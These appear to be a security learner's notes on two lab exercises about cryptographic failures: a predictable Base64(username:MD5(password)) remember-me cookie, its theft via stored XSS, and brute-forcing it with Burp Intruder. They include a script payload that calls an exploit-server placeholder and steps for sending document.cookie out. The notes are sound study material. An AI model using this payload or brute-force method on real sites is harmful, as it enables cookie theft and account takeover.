# A04:2025 - Cryptographic Failures Learning Notes

These notes preserve the longer learning reflections from the A04 labs.

The shorter lab evidence stays in [02-labs-or-practice.md](02-labs-or-practice.md).

## What I Learned About Base64

At first, I treated Base64 a bit like something that “protects” the value.

The important correction was:

> Base64 is not encryption. It is encoding.

Base64 does not use a secret key. Anyone can decode it.

In the lab, decoding the `stay-logged-in` cookie revealed the structure:

```text
username:md5(password)
```

This showed that the application was not protecting the data. It was only representing it in a different format.

## What I Learned About MD5

I initially described MD5 as “broken”. That was directionally true, but the better explanation is more specific:

- MD5 is old,
- MD5 is very fast,
- MD5 is not suitable for password protection,
- attackers can test large wordlists quickly,
- weak passwords can be cracked offline,
- MD5 should not be used for password-related security.

For password storage, modern applications should use adaptive, salted password hashing such as Argon2, bcrypt, scrypt, or PBKDF2 where appropriate.

However, a remember-me cookie should not contain a password hash at all.

## What I Learned About Remember-Me Tokens

The vulnerable cookie pattern was:

```text
Base64(username:MD5(password))
```

This is weak because it is predictable.

If an attacker knows the username and can guess candidate passwords, they can build candidate cookies:

```text
Base64(username:MD5(candidate-password))
```

A safer remember-me token should be random, high entropy, stored and validated server-side, expiring and revocable.

## What I Learned About HttpOnly

In the first lab, the `stay-logged-in` cookie did not have `HttpOnly`.

That meant JavaScript could read it:

```js
document.cookie
```

This mattered because stored XSS allowed the victim browser to send the cookie to the exploit server.

Important clarification:

> `HttpOnly` does not fix XSS. It reduces the impact of XSS by preventing JavaScript from reading protected cookies.

The XSS still needs to be fixed separately.

## Lab 1: What Was Difficult

The first lab took longer because it was a chain of several issues.

I had to understand:

1. what the `stay-logged-in` cookie was,
2. how to Base64 decode it,
3. what `username:hash` meant,
4. whether the hash was based on the username or password,
5. why `HttpOnly=false` mattered,
6. how stored XSS could read cookies,
7. how to send `document.cookie` to the exploit server,
8. why the exploit server log did not show the cookie at first,
9. how to debug the payload with a simple ping,
10. how the stolen hash led to offline cracking and account takeover.

The useful debugging step was testing a simple request first:

```html
<script>
new Image().src='https://<exploit-server>/exploit?ping=1';
</script>
```

Only after confirming that the ping reached the exploit server did I move to sending:

```js
document.cookie
```

This helped separate two problems:

- whether the XSS payload was executing,
- whether cookie exfiltration was working.

## Lab 2: What I Learned About Burp Intruder

The second lab was faster, but it taught an important Burp skill.

I used Intruder not only to insert payloads, but to transform them.

The target cookie format was:

```text
Base64(carlos:MD5(candidate-password))
```

In Intruder, each password from the wordlist was processed with:

```text
1. Hash: MD5
2. Add prefix: carlos:
3. Encode: Base64
```

This generated candidate `stay-logged-in` cookie values automatically.

I had not used Intruder payload processing this way before.

The practical lesson:

> Burp Intruder can transform payloads before sending them. This is useful when the vulnerable application expects a structured or encoded value.

## Questions I Asked During the Labs

These were the main questions that came up during the learning process:

- Does Burp have Base64 encode/decode?
- What does this decoded cookie value mean?
- Is the hash based on the username or the password?
- Why is Base64 not encryption?
- Why is MD5 weak in this situation?
- What does `HttpOnly=false` change?
- Why does the exploit server not show my payload?
- Should the exploit URL include `/exploit`?
- How do I make Intruder generate `Base64(username:MD5(password))` values?
- How do I recognise the successful Intruder response?

This is useful to keep in the notes because it shows the real learning path, not just the final answer.

## What Finally Clicked

The main thing that clicked was that the cookie was not a secure token.

It looked like a token, but it was actually a predictable data structure:

```text
username:password_hash
```

and then Base64 encoded.

Once the format was known, there were two possible attack paths:

1. steal a victim's cookie and crack the hash offline,
2. generate candidate cookies directly with Intruder.

Both worked because the remember-me design was weak.

## Key Difference Between Hashing, Encoding and Encryption

### Encoding

Encoding changes how data is represented.

Example:

```text
Base64
```

It is reversible without a secret key.

### Hashing

Hashing is one-way in design, but fast hashes such as MD5 are weak for passwords.

For passwords, use slow adaptive password hashing.

### Encryption

Encryption protects data using a key and is reversible only with the key.

The lab did not show encryption. It showed Base64 encoding plus MD5 hashing.

## Real-World Review Angle

In a real application, I would review:

- remember-me cookie format,
- whether cookies decode to meaningful values,
- whether password-derived values are sent to the browser,
- whether cookies have `HttpOnly`, `Secure`, and `SameSite`,
- whether persistent tokens expire,
- whether tokens can be revoked,
- whether password changes invalidate old tokens,
- whether tokens are random and high entropy,
- whether sensitive tokens are stored in JavaScript-readable storage,
- whether weak hashing such as MD5 or SHA1 appears in authentication flows.

## Summary

The most important A04 learning points were:

1. Base64 is encoding, not encryption.
2. MD5 is weak and too fast for password protection.
3. Remember-me cookies should not contain password hashes.
4. `HttpOnly` matters when XSS can read cookies.
5. A predictable token can be generated or brute-forced if its format is known.
6. Secure remember-me tokens should be random, server-side validated, expiring and revocable.
7. Burp Intruder payload processing can be used to test weak structured token designs.
